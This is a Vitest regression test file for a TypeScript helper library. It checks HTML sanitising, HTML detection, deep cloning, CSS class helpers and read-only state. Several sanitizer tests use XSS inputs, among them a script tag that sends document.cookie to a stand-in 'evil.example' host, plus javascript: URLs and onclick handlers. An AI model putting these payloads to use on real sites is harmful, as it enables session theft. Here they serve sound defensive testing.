import { describe, expect, it } from "vitest";
import {
  addClass,
  deepClone,
  isHTML,
  removeClass,
  sanitizeHTMLString,
  toggleClass,
} from "../src/helpers.ts";
import type { PartialElement } from "../src/types.ts";
import { readonly, toState } from "../src/utils.ts";

// Regression tests for 5 confirmed audit findings in helpers.ts/utils.ts.

describe("sanitizeHTMLString: strips <script> tags", () => {
  it("strips a paired <script>...</script> element", () => {
    const result = sanitizeHTMLString(
      '<div>x</div><script>fetch("https://evil.example/steal?c="+document.cookie)</script>',
    );
    expect(result).not.toContain("<script");
    expect(result).not.toContain("fetch(");
    expect(result).toContain("<div>x</div>");
  });

  it("strips a paired <script> element whose body spans multiple lines", () => {
    const result = sanitizeHTMLString(
      "<p>ok</p><script>\n  fetch('evil');\n  document.cookie;\n</script>",
    );
    expect(result).not.toContain("<script");
    expect(result).not.toContain("fetch(");
    expect(result).toContain("<p>ok</p>");
  });

  it("strips <script> case-insensitively", () => {
    const result = sanitizeHTMLString("<SCRIPT>alert(1)</SCRIPT>");
    expect(result).not.toMatch(/<script/i);
    expect(result).not.toContain("alert(1)");
  });

  it("strips a self-closing <script/> without eating trailing content", () => {
    const result = sanitizeHTMLString('<script src="evil.js"/><div>safe</div>');
    expect(result).not.toContain("<script");
    expect(result).toContain("<div>safe</div>");
  });

  it("strips an unclosed <script> tag (no matching </script>)", () => {
    const result = sanitizeHTMLString("<div>x</div><script>alert(1)");
    expect(result).not.toContain("<script");
    expect(result).not.toContain("alert(1)");
    expect(result).toContain("<div>x</div>");
  });

  it("still strips on* handlers and javascript: URLs alongside script removal", () => {
    const result = sanitizeHTMLString(
      '<script>alert(1)</script><a href="javascript:alert(2)" onclick="alert(3)">x</a>',
    );
    expect(result).not.toContain("<script");
    expect(result).not.toContain("javascript:alert");
    expect(result).not.toContain("onclick");
  });
});

describe("isHTML: multi-line single-element strings", () => {
  it("detects a paired tag whose content spans multiple lines", () => {
    expect(isHTML("<div>\nfoo\n</div>")).toBe(true);
  });

  it("detects a paired tag with nested multi-line markup", () => {
    expect(isHTML("<div>\n  <span>a</span>\n  <span>b</span>\n</div>")).toBe(
      true,
    );
  });

  it("still detects single-line paired and self-closing tags", () => {
    expect(isHTML("<strong>bold</strong>")).toBe(true);
    expect(isHTML('<img src="x"/>')).toBe(true);
  });

  it("still rejects plain text", () => {
    expect(isHTML("just text, no tags")).toBe(false);
  });
});

describe("deepClone: Date/Map/Set are actually cloned (not dead code)", () => {
  it("clones a Date (independent instance, same value)", () => {
    const date = new Date("2026-03-03T00:00:00Z");
    const clone = deepClone(date);
    expect(clone).not.toBe(date);
    expect(clone.getTime()).toBe(date.getTime());
  });

  it("clones a Map (independent instance, same entries)", () => {
    const map = new Map([["a", 1]]);
    const clone = deepClone(map);
    expect(clone).not.toBe(map);
    expect(clone).toEqual(map);
  });

  it("clones a Set (independent instance, same members)", () => {
    const set = new Set([1, 2, 3]);
    const clone = deepClone(set);
    expect(clone).not.toBe(set);
    expect(clone).toEqual(set);
  });

  it("still returns arbitrary class instances by reference", () => {
    class Foo {
      x = 1;
    }
    const instance = new Foo();
    expect(deepClone(instance)).toBe(instance);
  });
});

describe("removeClass/toggleClass: missing `class` does not stringify to 'undefined'", () => {
  it("removeClass on an element with no class produces an empty string, not 'undefined'", () => {
    const element: PartialElement = {};
    removeClass(element, "active");
    expect(element.class).toBe("");
  });

  it("removeClass on an element with an existing class removes only the target token", () => {
    const element: PartialElement = { class: "a b" };
    removeClass(element, "a");
    expect(element.class).toBe("b");
  });

  it("toggleClass on an element with no class adds the class cleanly (no 'undefined' token)", () => {
    const element: PartialElement = {};
    toggleClass(element, "active");
    // Splitting the normalized "" still leaves a leading empty token (a
    // pre-existing, unrelated quirk of split(" ")/join(" ")) — what matters
    // here is that the literal string "undefined" never appears.
    expect(String(element.class).trim()).toBe("active");
    expect(element.class).not.toContain("undefined");
  });

  it("toggleClass twice on an element with no class returns to empty string", () => {
    const element: PartialElement = {};
    toggleClass(element, "active");
    toggleClass(element, "active");
    expect(element.class).toBe("");
  });

  it("addClass on an element with no class does not include 'undefined'", () => {
    const element: PartialElement = {};
    addClass(element, "active");
    expect(element.class).toBe("active");
  });
});

describe("toState: read-only ReadableState sources pass through unchanged", () => {
  it("returns a readonly() source unchanged (no .set is fabricated)", () => {
    const source = toState(1, "source");
    const view = readonly(source);

    const result = toState(view as any);

    expect(result).toBe(view as any); // pass-through, not unwrapped/rewrapped
    expect(typeof (result as any).set).toBe("undefined");
    expect(result.get()).toBe(1);
  });

  it("still allocates a fresh, writable State for a plain value", () => {
    const state = toState(5);
    expect(typeof state.set).toBe("function");
    state.set(6);
    expect(state.get()).toBe(6);
  });

  it("returns an existing writable State unchanged", () => {
    const state = toState(1);
    expect(toState(state)).toBe(state);
  });
});
